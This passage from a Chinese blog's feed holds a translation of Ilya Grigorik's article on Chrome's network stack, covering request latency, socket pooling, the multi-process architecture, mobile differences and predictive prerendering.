<p>你可以访问<a href="http://prerender-test.appspot.com/" target="_blank" rel="external">prerender-test.appspot.com</a>来体验一下，打开<code>chrome://net-internals/#prerender</code>来查看预渲染的历史和当前状态。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xnetinternals-prerender.png" alt="xnetinternals-prerender.png"></p>
<p>如你所料，在后台tab中完整地渲染一个页面需要消耗大量的CPU和网络资源，因此我们只会在此页面非常可能用到的时候才会进行预渲染！比如之前提到的Omnibox的高可能性提示。相似的是，Google搜索有时也会为第一结果加入预渲染的提示（也称谓Google Instant Pages）。</p>
<p><a href="https://www.youtube.com/watch?v=_Jn93FDx9oI" target="_blank" rel="external">视频地址</a></p>
<p><strong>你也可以为你的网站添加预渲染的提示</strong>。不过，在你这么做之前，你需要知道预渲染由一些限制：</p>
<ul>
<li>在所有进程中，只允许一个预渲染的tab</li>
<li>不支持HTTPS和需要认证的HTTP页面</li>
<li>如果请求的资源，或其任何subresource需要进行一个非幂等(原文：nonidempotent)请求，（只允许GET）</li>
<li>所有的资源都是以最低网络优先级发出的</li>
<li>所有的页面都是以最低CPU优先级渲染的</li>
<li>如果页面使用超出100MB的内存，就会终止</li>
<li>推迟插件的初始化，如果存在HTML 5 媒体元素的话，也会终止</li>
</ul>
<p>换句话说，不能保证预渲染一定进行，并只在安全的情况下进行。还需提到的是，隐藏的页面也会执行Javascript和其他逻辑，最佳实践是利用<a href="https://developers.google.com/chrome/whitepapers/pagevisibility" target="_blank" rel="external">Page Visibility API</a>来检查页面是否可见，这也是你一定<a href="http://www.html5rocks.com/en/tutorials/pagevisibility/intro/" target="_blank" rel="external">会学的</a>。</p>
<h1 id="Chrome_u8D8A_u7528_u8D8A_u5FEB"><a href="#Chrome_u8D8A_u7528_u8D8A_u5FEB" class="headerlink" title="Chrome越用越快"></a>Chrome越用越快</h1><p><img src="/images/high-perf-network-in-chrome-trans/xchrome-speed-final.png" alt="xchrome-speed-final"></p>
<p>现在看来，Chrome的网络栈可比一个朴素的socket管理器复杂多了。我们这个简短地介绍了在浏览网页时你不可见的很多优化。Chrome越是学习网络的拓扑和你的习惯，做得越好。<strong>这就好像魔术一样，Chrome是越用越快的，不过它不是魔法，因为你已经知道它的内部机理了</strong>。</p>
<p>最后，还是需要提到Chrome团队一直努力迭代和实验，来不断提高性能。在你读到这里的时候，还是由很多新实验和优化在开发、测试和部署中。兴许某一天，我们达到了我们秒开（小于100ms）的目标时，我们可以歇一歇脚，不过在那之前，还有很多路要走！</p>
<blockquote>
<p>Ilya Grigorik，Google Web性能工程师，W3C Web性能小组的co-chair，High Performance Browser Networking (O’Reilly) 一书的作者，<a href="https://twitter.com/igrigorik" target="_blank" rel="external">Twitter</a>,<a href="https://plus.google.com/+IlyaGrigorik" target="_blank" rel="external">Google+</a></p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="u4F60_u4F7F_u7528_u6D4F_u89C8_u5668_u8FDB_u884C_u4F1A_u8BDD_u7684_u5168_u8FC7_u7A0B"><a href="#u4F60_u4F7F_u7528_u6D4F_u89C8_u5668_u]]>
    </summary>
    
      <category term="browser" scheme="http://yqf3139.github.io/tags/browser/"/>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="network" scheme="http://yqf3139.github.io/tags/network/"/>
    
      <category term="trans" scheme="http://yqf3139.github.io/categories/trans/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Google Chrome 中的高性能网络技术实践（翻译）上]]></title>
    <link href="http://yqf3139.github.io/2015/12/13/high-perf-network-in-chrome-trans/"/>
    <id>http://yqf3139.github.io/2015/12/13/high-perf-network-in-chrome-trans/</id>
    <published>2015-12-13T02:54:59.000Z</published>
    <updated>2015-12-14T13:01:33.158Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>看到Ilya Grigorik写的<a href="https://www.igvita.com/posa/high-performance-networking-in-google-chrome/" target="_blank" rel="external">这篇高性能网络技术实践</a>后，一直想找个机会好好阅读一下。之前遇到英文文章的话我还是喜欢偷个懒，直接找中文版本。借这个机会，第一次体会翻译英文文章。<br>还发现了<a href="http://chimera.labs.oreilly.com/books/1230000000545/ch17.html#_deploying_websocket_infrastructure" target="_blank" rel="external">全书免费线上阅读</a>，准备细细地读一下。</p>
</blockquote>
<h1 id="Google_Chrome_u7684_u5386_u53F2_u548C_u6307_u5357"><a href="#Google_Chrome_u7684_u5386_u53F2_u548C_u6307_u5357" class="headerlink" title="Google Chrome的历史和指南"></a>Google Chrome的历史和指南</h1><p>在2008的下半年，Chrome的Beta版本的登陆Windows平台。于此同时，Google将Chrome的核心代码以BSD许可开源，并称其为Chromium。对于关注它的人来说，这一事件引发了一个惊喜的猜想：浏览器大战再燃？Google真的可以做得更好吗？</p>
<blockquote>
<p>它体验实在太好了，这让我改变了我最初的想法。<br>– Eric Schmidt, 最初他对开发Chrome是抱有<a href="http://blogs.wsj.com/digits/2009/07/09/sun-valley-schmidt-didnt-want-to-build-chrome-initially-he-says/" target="_blank" rel="external">抵触想法</a>的</p>
</blockquote>
<p>现在看来，Chrome团队做到了。现在Chrome是全球最广泛使用的浏览器之一（依据StatCounter的统计，超过<a href="http://gs.statcounter.com/?PHPSESSID=oc1i9oue7por39rmhqq2eouoh0" target="_blank" rel="external">35%</a>的市场占有率），并提供了Windows、Linux、OS X 桌面平台版本和Android、iOS移动平台版本。显然，解决了用户痛点的特性与功能，和众多的创新点让Chrome跻身流行浏览器排行。</p>
<p>这本<a href="http://www.google.com/googlebooks/chrome/" target="_blank" rel="external">38页的漫画书</a>详细阐述了Chrome中创新的想法，这提供了一个绝佳的视角，供大家学习开发Chrome过程中思考和设计过程。不过这仅仅只是开始。驱动Chrome开发的核心原则并未改变，依旧是现在Chrome优化的指南：</p>
<ul>
<li><code>速度(Speed)</code>     ：目标就是要做出<strong>最快</strong>的浏览器</li>
<li><code>安全(Security)</code>  ：为用户提供<strong>最安全</strong>的使用环境</li>
<li><code>稳定(Stability)</code> ：提供<strong>稳定而有弹性</strong>的Web应用平台</li>
<li><code>简洁(Simplicity)</code>：用复杂的技术驱动起上层<strong>简单的用户体验</strong></li>
</ul>
<p>据团队观察，很多我们现在使用的网站不是简简单单的网页了，而是应用。这样看来，越来越多野心勃勃的应用都把速度、安全、稳定和简洁作为追求，而对于每一个最求，都需要单独成文来说，本文的主题是高性能，所以主要讨论速度。</p>
<h1 id="u4ECE_u591A_u4E2A_u65B9_u9762_u6765_u770B_u9AD8_u6027_u80FD"><a href="#u4ECE_u591A_u4E2A_u65B9_u9762_u6765_u770B_u9AD8_u6027_u80FD" class="headerlink" title="从多个方面来看高性能"></a>从多个方面来看高性能</h1><p>现代浏览器是一个平台，就像操作系统一样，Chrome就是照此标准设计的。在Chrome之前，所有主流的浏览器都是单进程应用。所有打开的网页共用一个内存区域，并相互争夺共享的资源。任何页面中或是浏览器中的Bug，都带来了牺牲全局体验的风险。</p>
<p>而Chrome另辟蹊径，工作在一个多进程的模式下。它提供了进程和内存隔离，并将每一个页面运行在<a href="http://dev.chromium.org/developers/design-documents/sandbox" target="_blank" rel="external">安全的沙箱</a>环境中。在目前多核处理器流行的背景下，隔离进程和保护页面不受恶意网页攻击被证明是Chrome在激烈竞争中的很好抓手。值得注意的是，很多浏览器也迁移到了这一多进程的架构，或是正在迁移之中。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/comic-multi-process.png" alt="comic-multi-process"></p>
<p>在多进程环境启动后，Web应用的执行主要包含一下三个任务：获取资源、页面布局与渲染、Javascript执行。渲染和脚本执行依照一个单线程、交叉执行的模型——这是由于不能对DOM进行并发修改，这也是Javascript自身单线程的特性造成的。因此，对于Web应用开发者和浏览器开发者，怎样在运行时协同优化渲染和脚本执行是关键一环。</p>
<p>Chrome使用<a href="http://www.chromium.org/blink" target="_blank" rel="external">Blink</a>作为渲染引擎，它也是为速度而生，是一个开源的、标准支持良好的布局引擎。对于Javascript，Chrome推出了精心优化过的Javascript运行环境，<a href="http://en.wikipedia.org/wiki/V8_(JavaScript_engine" target="_blank" rel="external">V8</a>)，V8也独立作为项目开源，得到了广泛的使用，例如它也是Node.js的运行环境。<strong>不过，如果是浏览器阻塞在网络IO上，针对V8虚拟机优化，或者是对Blink解析和渲染流水线的优化不会产生很好的效果，因为大部分时间还是消耗在了等待网络资源上</strong>。</p>
<p>总用户体验中的最关键因素之一，便是浏览器优化各种网络资源的加载顺序、优先级和延时的能力。你可能都注意不到它，但Chrome的网络栈便是每天逐步演化得更加聪明。它尝试隐去或是降低各种资源加载带来的时延：预先加载最可能的DNS查询、记住网络的拓扑结构、向可能的目标提前发起连接等等。从使用者的角度来看，它只是一个简单的资源加载工具，而从内部来看，它相当精巧和迷人地示范了怎样进行网络性能调优，以及如何带给用户最好的使用体验。</p>
<p>那就让我们一探究竟吧。</p>
<h1 id="u73B0_u4EE3_u7684Web_u5E94_u7528_u662F_u600E_u6837_u7684_uFF1F"><a href="#u73B0_u4EE3_u7684Web_u5E94_u7528_u662F_u600E_u6837_u7684_uFF1F" class="headerlink" title="现代的Web应用是怎样的？"></a>现代的Web应用是怎样的？</h1><p>在我们接触如何对网络进行优化的技术细节之前，理解Web发展潮流和我们需要面对的问题会有所帮助。<strong>一个现代的Web页面，或者是一个Web应用究竟是怎样的？</strong></p>
<p><a href="http://httparchive.org/" target="_blank" rel="external">HTTPArchive</a>项目追踪着互联网是如何构建的，它能帮我们回答这些问题。它周期性地爬取最流行的站点，对它们使用的资源数量、文件类型、headers和各种元数据进行记录和聚合分析，而并不关注站点的内容数据。2013年一月的数据可能会让你惊讶，在最流行的300,000个站点中，平均下来一个网页的数据如下：</p>
<p><img src="/images/high-perf-network-in-chrome-trans/httparchive-jan2013.png" alt="httparchive-jan2013"></p>
<ul>
<li>大小约为<strong>1280KB</strong></li>
<li>共计<strong>88个资源文件</strong></li>
<li>共连接了超过<strong>15个独立的主机</strong></li>
</ul>
<p>让我们细细分析一下。平均大于1MB的数据传输，包含88个资源文件如图片、Javascript和CSS，并是从15个独立的主机或第三方主机加载而来！这些数字在过去几年中都在<a href="http://httparchive.org/trends.php" target="_blank" rel="external">稳定增长</a>，现在看来没有减缓停止的趋势。这说明我们在不断开发更大的Web应用。</p>
<p>稍加计算我们发现资源的平均大小是12KB（1045KB/84），这说明<strong>浏览器中大多数的网络传输是短小猝发的</strong>。因为使用的底层协议(TCP)是专为较大和流式文件传输优化的，这就带来了一系列并发问题。让我们逐步剥开一个网络Request看看。</p>
<h1 id="u4E00_u4E2ARequest_u7684_u4E00_u751F"><a href="#u4E00_u4E2ARequest_u7684_u4E00_u751F" class="headerlink" title="一个Request的一生"></a>一个Request的一生</h1><p>W3C <a href="http://www.w3.org/TR/navigation-timing/" target="_blank" rel="external">Navigation Timing specification</a>提供了一个浏览器API来展示每一次Request的性能数据。让我们详细观察这些组成部分，因为它们都是优化的用户体验的一个重要组成部分。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/request-life.png" alt="request-life"></p>
<p>给定一个网络资源的URL，浏览器从检查本地caches开始。如果之前已经加载过这份资源并且<a href="https://developers.google.com/speed/docs/best-practices/caching" target="_blank" rel="external">和cache控制相关的headers</a>已经被设置(<em>比如Expires, Cache-Control</em>)，接着便可使用本地的拷贝来回应这个Request-<strong>最快的Request便是不产生真实的Request</strong>。有时文件过期，我们需要重新让这个文件具有最新的时效，或是之前没有加载过它，那么一个网络Request必须被发出，不过这是代价高昂的。</p>
<p>给定一个Hostname和Resource Path，Chrome先检查是否有打开的连接可以被重用，Sockets以{scheme, host, port}的三元组被池化使用。如果Proxy被设置，或是使用了一个自动Proxy设置脚本(PAC)，Chrome会通过合适的Proxy检测连接。PAC脚本允许针对URL路由不同的Proxy，这每一套规则都有其自己的Socket池。最终，如果以上条件都不满足，那么<strong>这个Request必须首先将主机名解析为IP地址，即DNS查询开始</strong>。</p>
<p>如果幸运的话，这个Hostname已经被查询过并被缓存，那么我们距离Response就只有一个系统调用的距离了。不是这样的话，那么DNS查询必须完成，之后其他工作才能继续开展。DNS查询的时间依据网络提供商的不同，可能差距很大，比如网站的流行度和本Hostname在中间DNS服务器缓存的可能性，还有对应域名服务器的响应时间，都会影响这一时间消耗。换句话说便是变数很多，而且要知道一个<em>数百毫秒</em>的DNS查询也不是不常见，真是肉疼。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/three-way-handshake.png" alt="three-way-handshake"></p>
<p>解析好的IP地址到手后，Chrome便可向目标打开一个新的TCP连接，这需要经过<a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment" target="_blank" rel="external">三次握手</a>：<code>SYN &gt; SYN-ARK &gt; ACK</code>。这次数据交换<strong>让每个新的TCP连接都背负了一个完整的Roundtrip时延</strong>，似乎没有捷径可走。依据客户端和服务端的距离与选择的路由路径，这可造成十至百，乃至上千毫秒的延时。这些工作都是在一个有效的Request数据传输前需要消耗的！</p>
<p>一旦TCP握手完成，如果我们是用HTTPS协议建立连接的话，SSL握手又将开始。这又将<strong>增加两个Roundtrip时延</strong>，如果SSL回话被缓存，那么我们可以开心地节省一次Roundtrip。</p>
<p>终于，Chrome可以发送HTTP Request（上图<code>requestStart</code>标识）。服务器收到回复后便处理Request并发送Response。这造成了一个Roundtrip，并加上服务器的处理时间。似乎我们终于结束了，不过如果如果返回了HTTP Redirect，我们还需要再重走一遍。所以如果你服务器上有好几个Redirect，最好优化一下这个实现。</p>
<p>你是不是已经开始计算总的延时了呢？我们在特定的带宽情况下来假设一个延时最大的情况，本地缓存失效，立刻执行一个较快的DNS查询（50ms），TCP握手，SSL握手和一个相对较快的服务器响应时间（100ms），并设定Roundtrip时间为80ms（一个跨越美洲的平均时间）。</p>
<ul>
<li>50ms DNS查询</li>
<li>80ms TCP握手，（一次RTT）</li>
<li>160ms SSL握手，（两次RTT）</li>
<li>40ms 发送请求给服务器</li>
<li>100ms 服务器处理请求</li>
<li>40ms 服务器返回结果</li>
</ul>
<p>本单次Request总计470毫秒，<strong>其中和真正的服务器处理请求的时间想比，80%的时间消耗在了网络延时上</strong>。我们得做点什么！事实上，470毫秒已经是一个乐观的估计了：</p>
<ul>
<li>如果服务器的响应不能被装入一个最先的TCP<a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Congestion_control" target="_blank" rel="external">拥塞窗口</a> （4-15 KB），那么需要继续加上一个或多个Roundtrip延时。</li>
<li>如果我们需要加载一个缺失的证书，或是进行一个<a href="http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol" target="_blank" rel="external">在线证书状态检查</a>（OCSP），SSL延时可能会更长。可能会增加数百上千的毫秒延时。</li>
</ul>
<h1 id="u600E_u6837_u7B97_u662F_u201C_u8DB3_u591F_u5FEB_u201D_uFF1F"><a href="#u600E_u6837_u7B97_u662F_u201C_u8DB3_u591F_u5FEB_u201D_uFF1F" class="headerlink" title="怎样算是“足够快”？"></a>怎样算是“足够快”？</h1><p>在我们之前的例子中，由于DNS、握手和Roundtrip造成的延时是影响总延时的大头，其中服务器造成的延时只有区区20%。但是，<strong>从更加宏观的角度来看，这个延时有造成影响吗</strong>？在读本文的你可能已经知道了答案：对，影响很大。</p>
<p>之前的<a href="http://www.useit.com/papers/responsetime.html" target="_blank" rel="external">用户体验调查</a>展示了我们作为用户，对各种应用响应程度的需求：</p>
<table>
<thead>
<tr>
<th style="text-align:center">延时</th>
<th style="text-align:center">用户反馈</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0 - 100ms</td>
<td style="text-align:center">秒开啊</td>
</tr>
<tr>
<td style="text-align:center">100 - 300ms</td>
<td style="text-align:center">似乎顿了一下</td>
</tr>
<tr>
<td style="text-align:center">300 - 1000ms</td>
<td style="text-align:center">好吧还好不是死机</td>
</tr>
<tr>
<td style="text-align:center">1s+</td>
<td style="text-align:center">我刚才想干什么来着</td>
</tr>
<tr>
<td style="text-align:center">10s+</td>
<td style="text-align:center">容我去睡一会</td>
</tr>
</tbody>
</table>
<p>上表也解释了Web性能社区的一个不成文的规定：渲染页面，或者至少在250ms内提供视觉反馈，来保持用户的注意力。这不能算是从源头上提高了速度。Google、Amazon、Microsoft等千家网站都发现额外的延时对网站有着直接影响：<code>更快的网站意味着更多的PV，更高的参与度和更高的转化率</code>。</p>
<p>说到这你应该明白了，我们优化目标是250ms，而上述DNS查询，TCP/SSL握手和Request传输时间加在一起足足由370ms，我们已经超了50%的时间，并且我们甚至还没有考虑服务器的时间消耗！</p>
<p>对于绝大多数用户，甚至开发者而言，DNS、TCP和SSL延时都是完全透明的，并且是在网络层进行的，我们便较少深入和思考。但这些步骤却对总体用户体验有着极大的影响，因为这都可能带来十或百的毫秒延时。<strong>这就是为什么Chrome的网络栈比一个简单的Socket处理程序复杂很多的原因</strong>。</p>
<p><em>现在我们已经认清了问题所在，让我们深入实现细节看看</em>。</p>
<h1 id="u4ECE10_2C000_u82F1_u5C3A_u9AD8_u5EA6_u9E1F_u77B0Chrome_u7684_u7F51_u7EDC_u6808"><a href="#u4ECE10_2C000_u82F1_u5C3A_u9AD8_u5EA6_u9E1F_u77B0Chrome_u7684_u7F51_u7EDC_u6808" class="headerlink" title="从10,000英尺高度鸟瞰Chrome的网络栈"></a>从10,000英尺高度鸟瞰Chrome的网络栈</h1><h2 id="u591A_u8FDB_u7A0B_u67B6_u6784"><a href="#u591A_u8FDB_u7A0B_u67B6_u6784" class="headerlink" title="多进程架构"></a>多进程架构</h2><p>Chrome的多进程架构明显地暗示了在浏览器中一个网络Request是如何处理的。在底层，Chrome实际上支持<a href="http://www.chromium.org/developers/design-documents/process-models" target="_blank" rel="external">四种不同的执行模型</a>来确定使用哪一种进程分配模型。</p>
<p>默认情况下，桌面版的Chrome使用Process-per-site模型，这将不同网站隔离开来，并将同一网站的所有实例都组在一个进程中。不过，为了更加方便大家理解，让我们假设这样一个简单的情况：对于每一个打开的tab，都分配一个独立的进程。从网络性能角度来考虑，区别不是很大，但Process-per-tab的模型更加容易理解。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/process-model.png" alt="process-model"></p>
<p>这一架构下，每一个<strong>渲染进程</strong>都对应与一个tab，其中都运行着开源Blink布局引擎，它是解释和进行HTML布局的（也就是图中的“HTML Renderer”），还运行着V8 Javascript虚拟机、桥接这两个引擎的代码和一些其他组件。如果你感兴趣的话，可以查看Chromium wiki中的<a href="http://www.chromium.org/developers/design-documents/multi-process-architecture" target="_blank" rel="external">介绍</a>。</p>
<p>每一个这些“render”进程都在沙盒环境下执行，这保证它们对用户电脑的访问受限，当然也包含了网络。为了获取这些资源，每一个render进程和Browser主进程进行通信，这就可以为每一个render加上安全的访问策略。</p>
<h2 id="u8FDB_u7A0B_u5185_u901A_u4FE1_uFF08IPC_uFF09_u548C_u591A_u8FDB_u7A0B_u8D44_u6E90_u52A0_u8F7D"><a href="#u8FDB_u7A0B_u5185_u901A_u4FE1_uFF08IPC_uFF09_u548C_u591A_u8FDB_u7A0B_u8D44_u6E90_u52A0_u8F7D" class="headerlink" title="进程内通信（IPC）和多进程资源加载"></a>进程内通信（IPC）和多进程资源加载</h2><p>在Render和Browser进程间的所有通信都是通过IPC完成的。在Linux和OS X中，一个<code>socketpair()</code>用来提供一个异步的、有标识的管道传输。每个来自render的消息都被序列化后，传递给一个专用的I/O线程，由I/O线程再向Browser进程分发。在接收端，Browser进程提供一个过滤器接口，这运行Chrome对资源IPC请求进行拦截处理（查看<a href="http://code.google.com/p/chromium/source/search?q=resourcemessagefilter&amp;origq=resourcemessagefilter&amp;btnG=Search+Trunk" target="_blank" rel="external">ResourceMessageFilter</a>），转交给网络栈进行处理。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/network-stack.png" alt="network-stack"></p>
<p>一个本架构的好处是<code>所有的资源Request都在I/O线程上处理，所以任何UI触发的活动或是网络事件会不相互干涉</code>。资源过滤器在Browser进程的I/O线程中执行，拦截资源Request消息，并将它们转发给Browser进程中的<a href="http://code.google.com/searchframe#OAMlx_jo-ck/src/content/public/browser/resource_dispatcher_host.h&amp;exact_package=chromium&amp;q=ResourceDispatcherHost" target="_blank" rel="external">ResourceDispatcherHost</a>单实例对象。</p>
<p>单实例接口下，浏览器可控制每个render对网络的访问，这也让一个高效和一致的资源共享机制成为可能。</p>
<ul>
<li><strong>Socket池和连接数限制</strong>：浏览器可限制打开的sockets数量，默认为256每个profile，32每个Proxy，和6每个<code>{scheme, host, port}</code>三元组。这表明同时最大可以允许6个HTTP和6个HTTPS连接到同一个<code>{host, port}</code>！</li>
<li><strong>Socket重用</strong>：TCP连接在为某Request服务后可以不断开，被保存在Socket池中以重用，这也就避免了附加的DNS，TCP和SSL(如果需要的话)重新建立带来的开销。</li>
<li><strong>Socket后期绑定</strong>：Requests只有在socket可以传输应用的Request的时候，才和一个底层的TCP连接绑定，这样便可更好进行Request的优先级调度（例如在socket建立连接的时候，产生了更高优先级的Request），更好的吞吐（比如在打开新的连接的时候，已有的socket变为可用状态，便可以重复使用“热”的TCP连接）。同时还有TCP预连接和一系列的其他优化。</li>
<li><strong>持续的会话状态</strong>：验证，Cookies和缓存数据可以在所有的render进程间共享。</li>
<li><strong>全局资源和网络优化</strong>：可以基于所有的请求进行决策，比如说，给予前台tab的网络请求更高的优先级。</li>
<li><strong>基于预测的优化</strong>：通过观察所有的网络流量，Chrome可以建立并改善预测模型来提升性能。</li>
<li><em>还有很多</em></li>
</ul>
<p>对于render进程来说，它需要做的仅仅是用一个独特的Request ID来标记一个Request请求消息，并通过IPC发送出去，然后一切交由Browser进程接手。</p>
<h2 id="u8DE8_u5E73_u53F0_u7684_u8D44_u6E90_u83B7_u53D6"><a href="#u8DE8_u5E73_u53F0_u7684_u8D44_u6E90_u83B7_u53D6" class="headerlink" title="跨平台的资源获取"></a>跨平台的资源获取</h2><p><img src="/images/high-perf-network-in-chrome-trans/cross-platform.webp" alt="cross-platform"></p>
<p>在实现Chrome的网络栈中，其中一个主要的关注点便是在多个平台间的可移植性：Linux, Windows, OS X, Chrome OS, Android, 和iOS。为了应对这一挑战，<code>网络栈被实现为通常单线程工作（有分离的缓存和代理线程）的，跨平台的库</code>，这使Chrome可重用相同的基础代码，并提供相同的性能优化，这也是跨平台优化的绝佳机会。</p>
<p>所有相关的网络的代码，都开源在<a href="https://code.google.com/p/chromium/codesearch#chromium/src/net/&amp;ct=rc&amp;cd=1&amp;q=src.net&amp;sq=package:chromium" target="_blank" rel="external">src/net 子目录</a>。在这我们不会详细讨论所有的模块，但你能从代码的布局看出它的结构和可以跨越的平台。举个例子：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">net/android</td>
<td style="text-align:left">Android运行时的绑定</td>
</tr>
<tr>
<td style="text-align:center">net/base</td>
<td style="text-align:left">通用网络工具库，例如域名解析，cookies，网络环境变动侦测，SSL证书管理</td>
</tr>
<tr>
<td style="text-align:center">net/cookies</td>
<td style="text-align:left">HTTP cookies的存储、管理和获取的实现</td>
</tr>
<tr>
<td style="text-align:center">net/disk-cache</td>
<td style="text-align:left">网络资源的磁盘和内存的缓存实现</td>
</tr>
<tr>
<td style="text-align:center">net/dns</td>
<td style="text-align:left">一个异步DNS解析器的实现</td>
</tr>
<tr>
<td style="text-align:center">net/http</td>
<td style="text-align:left">HTTP协议的实现</td>
</tr>
<tr>
<td style="text-align:center">net/proxy</td>
<td style="text-align:left">代理（Socks和HTTP）配置，解析，脚本获取等等</td>
</tr>
<tr>
<td style="text-align:center">net/socket</td>
<td style="text-align:left">跨平台的TCP sockets实现，SSL流和Socket池</td>
</tr>
<tr>
<td style="text-align:center">net/spdy</td>
<td style="text-align:left">SPDY协议实现</td>
</tr>
<tr>
<td style="text-align:center">net/uri_request</td>
<td style="text-align:left">URLRequest, URLRequestContext, and URLRequestJob的实现</td>
</tr>
<tr>
<td style="text-align:center">net/websocket</td>
<td style="text-align:left">Websockets协议实现</td>
</tr>
</tbody>
</table>
<p>以上每一个子模块都适合好奇的你阅读，代码文档齐全，并且你会找到不少单元测试。</p>
<h2 id="u5728_u79FB_u52A8_u5E73_u53F0_u4E0A_u7684_u67B6_u6784_u548C_u6027_u80FD"><a href="#u5728_u79FB_u52A8_u5E73_u53F0_u4E0A_u7684_u67B6_u6784_u548C_u6027_u80FD" class="headerlink" title="在移动平台上的架构和性能"></a>在移动平台上的架构和性能</h2><p><img src="/images/high-perf-network-in-chrome-trans/mobile.png" alt="mobile"></p>
<p>即便是谨慎估计，移动浏览器的使用率也呈现出指数级的增长，可以预期在不远的将来，它将蚕食桌面浏览器的份额，令其黯然失色。因此对于Chrome团队，带给用户良好的移动浏览体验是具有极高优先级的。在2012年初，<a href="http://www.google.com/intl/en/chrome/browser/mobile/android.html" target="_blank" rel="external">Chrome Android</a>推出，几个月后，<a href="http://www.google.com/intl/en/chrome/browser/mobile/ios.html" target="_blank" rel="external">Chrome iOS</a>也推向市场。</p>
<p><strong>对于Chrome的移动版本，你需要了解的头一件事情便是它不是桌面浏览器的直接移植</strong>，如果那样将不能获得最好的用户体验。客观来说，移动环境资源更加紧缺，并有着更多不同的操作参数：</p>
<ul>
<li>桌面用户使用鼠标浏览，可能由重叠的窗口，有很大的显示屏，并且一半没有电池能耗限制，通常有一个稳定的网络连接，并有更大的磁盘存储和内存。</li>
<li>移动用户使用触摸和手势进行浏览，有很小的屏幕，需要考虑能耗，网络连接不畅，只有受限的存储和内存。</li>
</ul>
<p>更进一步来说，很难说一个设备是典型的“<em>移动设备</em>”，反倒是很大量的设备的性能都各不相同，Chrome必须对每个设备都能很好的适应，才能带来最佳的性能。幸运的是，正是因为多种多样的运行模型，Chrome才能做到这种适应性。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/android-chrome.png" alt="android-chrome"></p>
<p><strong>在Android设备上，Chrome也使用了和桌面版本相同的多进程架构</strong>，有一个Browser进程，和一个或多个Renderer进程。唯一的不同便是移动设备的内存容量限制，Chrome不太可能还是采取每个tab一个Renderer的策略。Chrome通过可用的内存，和设备的其他限制条件，来确定最优的Renderer数量。它会在多个tab中分享Renderer进程。</p>
<p>在只有很少的资源可用，或者是Chrome不能启动多进程架构的时候，它还是可以切换到一个单进程多线程的运行模型中。事实上，<strong>在iOS设备上，由于底层平台的沙箱限制，Chrome就是这么做的——单进程多线程运行</strong>。</p>
<p>那网络性能呢？首先，<strong>在Android和iOS中，Chrome使用了同样的网络栈，其他平台也一样</strong>。这让Chrome可以在多平台下实现相同的网络优化，这对Chrome的性能优化工作来说十分重要。但是，某些参数比如预测优化的优先级、Socket的超时、管理逻辑和缓存大小，在不同平台间还是有所区别的，并随着设备的能力和使用的网络动态调整。</p>
<p>例如，为了节约电池，移动版Chrome有选择地推迟关闭空闲的Socket，仅仅当打开新的Socket后，才会关闭旧的，这样可以最小化发射功率。类似的是，我们上文中提到的预渲染，是需要一笔不菲的网络和处理资源支出的，这通常在用户处于WIFI环境下才会开启。</p>
<p>对于Chrome开发团队来说，优化移动浏览体验是处于最高优先级列表中的一个，可以预见的是，<strong>很多新的提升</strong>将不断推出。事实上，这个话题值得单独成文，兴许在POSA系列的下一篇中。</p>
<h2 id="u63A8_u6D4B_u5F0F_u7684Chrome_u9884_u6D4B_u4F18_u5316"><a href="#u63A8_u6D4B_u5F0F_u7684Chrome_u9884_u6D4B_u4F18_u5316" class="headerlink" title="推测式的Chrome预测优化"></a>推测式的Chrome预测优化</h2><p><img src="/images/high-perf-network-in-chrome-trans/chrome-wings.png" alt="chrome-wings"></p>
<p><strong>你越是使用，Chrome越快</strong>。这得归功于<code>Predictor</code>单例对象。它在Browser进程中国被初始化，而它的职责就是观察网络模式，学习并预测用户接下来可能的动作。比如说：</p>
<ul>
<li>当用户将鼠标置于某一个超链接上时，这说明他接下来可能会导航到那里，Chrome便可以预先开始进行DNS查询，甚至预先进行TCP握手。等当用户真正点击的时候，这通常已经过去了大约200ms，我们很可能已经完成了DNS和TCP阶段，为这次浏览节约了数百毫秒的额外时延。</li>
<li>在Omnibox（URL）中输入时，会根据相似度提示，这也会激活类似的预测优化：DNS查询、TCP预连，甚至可以在后台预先渲染出这个页面。</li>
<li>我们每人都有最爱的一些网站。Chrome可以从这些站点的资源中学习，并预测性地预先解析、获取这些资源来加速浏览体验。</li>
<li>这个列表还能写很长…</li>
</ul>
<p>Chrome会发现网络的拓扑，并在你使用时学习你独有的浏览习惯。如果一切顺利的话，它将为用户每次浏览节省下数百毫秒的延时，让用户接近“秒开”的畅快体验。为了做到这一点，Chrome利用了四个核心优化技术：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">DNS 预解析</td>
<td style="text-align:left">提前进行域名解析，来避免DNS延时</td>
</tr>
<tr>
<td style="text-align:center">TCP 预连接</td>
<td style="text-align:left">提前和目标服务器进行连接，来避免TCP握手延时</td>
</tr>
<tr>
<td style="text-align:center">资源预加载</td>
<td style="text-align:left">提前获取关键资源文件，来加速页面的渲染</td>
</tr>
<tr>
<td style="text-align:center">页面预渲染</td>
<td style="text-align:left">提前获取整个页面，包括所有的资源文件，当用户真正点击时，带来秒开的体验</td>
</tr>
</tbody>
</table>
<p>每个优化动作在触发前，都要经过一系列的限制条件，毕竟，这仅仅只是通过预测来优化，如果预测失败的话，不必要的计算和网络浏览就白消耗了，甚至会对用户的实际浏览造成负面的影响。</p>
<p>那Chrome是如何解决这一问题的呢?<strong>预测器会处理尽量多的信号，其中包括了用户产生的动作、历史浏览记录和render、网络栈产生的信号</strong>。</p>
